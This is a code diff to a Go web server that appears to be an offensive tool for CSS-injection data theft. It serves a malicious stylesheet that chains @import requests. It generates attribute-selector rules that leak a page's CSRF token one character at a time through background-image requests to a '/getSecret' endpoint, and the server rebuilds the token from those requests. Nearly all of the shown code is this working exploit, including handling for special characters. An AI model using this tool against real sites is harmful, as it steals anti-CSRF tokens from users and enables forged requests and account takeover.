@@ -8,30 +8,25 @@ import (
 )
 
 var (
-	tokenName  string
-	tokenValue string
-	listOfChar string
-	verbose    bool
-	tokenLen   int
+	TokenName  string
+	TokenValue string
+	ListOfChar string
+	Verbose    bool
+	TokenLen   int
 )
 
 func hello(rw http.ResponseWriter, req *http.Request) {
-	if verbose {
+	if Verbose {
 		fmt.Print("[Verbose] Request made to \"hello/\"\n")
 	}
 
-	var webpage string = `
-	<html>
-		<input name="csrf" value="456es4f5fgd5g6qdrg5qdrg5qdr2k5uylqzeze5gs564g" class="csrf">
-		<style> @import url("/launchAttack?len=0") (max-width: 100000px); </style>
-	</html>
-	`
+	var webpage string = "<html><input name=\"csrf\" value=\"test \\ test\" class=\"csrf\"><style> @import url(\"/launchAttack?len=" + strconv.Itoa(len(TokenValue)) + "\")</style></html>"
 
 	fmt.Fprint(rw, webpage)
 }
 
 func getSecret(rw http.ResponseWriter, req *http.Request) {
-	if verbose {
+	if Verbose {
 		fmt.Print("[Verbose] Request made to \"getSecret/\"\n")
 		fmt.Printf("[Verbose] Query = %s\n", req.URL.Query())
 	}
@@ -41,32 +36,43 @@ func getSecret(rw http.ResponseWriter, req *http.Request) {
 
 	//If it exists, add it to the current token
 	if param != "" {
-		tokenValue += param
-		fmt.Printf("%s = %s\n", tokenName, tokenValue)
+		TokenValue += param
+		fmt.Printf("%s = %s\n", TokenName, TokenValue)
 	}
+
+	rw.WriteHeader(http.StatusOK)
 }
 
 func attack(rw http.ResponseWriter, req *http.Request) {
 
-	if verbose {
+	if Verbose {
 		fmt.Print("[Verbose] Request made to \"attack/\"\n")
 		fmt.Printf("[Verbose] Query = %s\n", req.URL.Query())
 	}
 
 	//Create CSS that will make a request which will exfiltrate a new char from the token
 	var css string = ""
-	for _, ch := range listOfChar {
-		css += "input[name=" + tokenName + "][value^=\"" + tokenValue + string(ch) + "\"] "
+	for _, ch := range ListOfChar {
+		css += "input[name=" + TokenName + "][value^=\"" + TokenValue + string(ch) + "\"] "
 		css += "{\n\tbackground-image: url(\"/getSecret?char=" + string(ch) + "\");\n}\n\n"
 	}
+
+	//add Inputs for space, \ and "
+	css += "input[name=" + TokenName + "][value^=\"" + TokenValue + " \"]"
+	css += "{\n\tbackground-image: url(\"/getSecret?char=%20\");\n}\n\n"
+	css += "input[name=" + TokenName + "][value^=\"" + TokenValue + "\\\\\"]"
+	css += "{\n\tbackground-image: url(\"/getSecret?char=\\\\\");\n}\n\n"
+	css += "input[name=" + TokenName + "][value^=\"" + TokenValue + "\\\" \"]"
+	css += "{\n\tbackground-image: url(\"/getSecret?char=%22\");\n}\n\n"
+
 	//Send the response
 	rw.Header().Set("Content-Type", "text/css")
 	rw.WriteHeader(http.StatusOK)
 	fmt.Fprint(rw, css)
 }
 
-func test(rw http.ResponseWriter, req *http.Request) {
-	webpage := "@import url(\"/launchAttack?len=0\") (max-width: 100000px);\n"
+func maliciousCSS(rw http.ResponseWriter, req *http.Request) {
+	webpage := "@import url(\"/launchAttack?len=" + strconv.Itoa(len(TokenValue)) + "\") (max-width: 100000px);\n"
 
 	//Send the response
 	rw.Header().Set("Content-Type", "text/css")
@@ -76,7 +82,7 @@ func test(rw http.ResponseWriter, req *http.Request) {
 
 func launchAttack(rw http.ResponseWriter, req *http.Request) {
 
-	if verbose {
+	if Verbose {
 		fmt.Print("[Verbose] Request made to \"launchAttack/\"\n")
 		fmt.Printf("[Verbose] Query = %s\n", req.URL.Query())
 	}
@@ -85,13 +91,16 @@ func launchAttack(rw http.ResponseWriter, req *http.Request) {
 	index := req.URL.Query().Get("len")
 	nb, _ := strconv.Atoi(index)
 
-	if tokenLen > nb {
+	if TokenLen > nb {
 		var webpage string = ""
 
 		//Wait a little bit
-		for nb > len(tokenValue) {
-			time.Sleep(5000000000)
-			fmt.Printf("len = %d wake up\n", nb)
+		for nb > len(TokenValue) {
+			time.Sleep(500000000)
+			if Verbose {
+				fmt.Printf("[Verbose] len = %d wake up\n", nb)
+				fmt.Printf("[Verbose] len(TokenValue) = %d\n", len(TokenValue))
+			}
 		}
 
 		//Create the CSS that will make two requests
@@ -107,17 +116,7 @@ func launchAttack(rw http.ResponseWriter, req *http.Request) {
 
 }
 
-func StartTool(port int, secret string, listChar string, v bool, ls int) {
-	tokenName = secret
-	tokenValue = ""
-	listOfChar = listChar
-	verbose = v
-	tokenLen = ls
-
-	launchServer(port)
-}
-
-func launchServer(port int) {
+func LaunchServer(port int) {
 
 	fmt.Printf("Server launch on port %d\n", port)
 
@@ -125,7 +124,7 @@ func launchServer(port int) {
 	http.HandleFunc("/launchAttack", launchAttack)
 	http.HandleFunc("/attack", attack)
 	http.HandleFunc("/getSecret", getSecret)
-	http.HandleFunc("/test.css", test)
+	http.HandleFunc("/malicious.css", maliciousCSS)
 
 	http.ListenAndServe(":"+strconv.Itoa(port), nil)
 
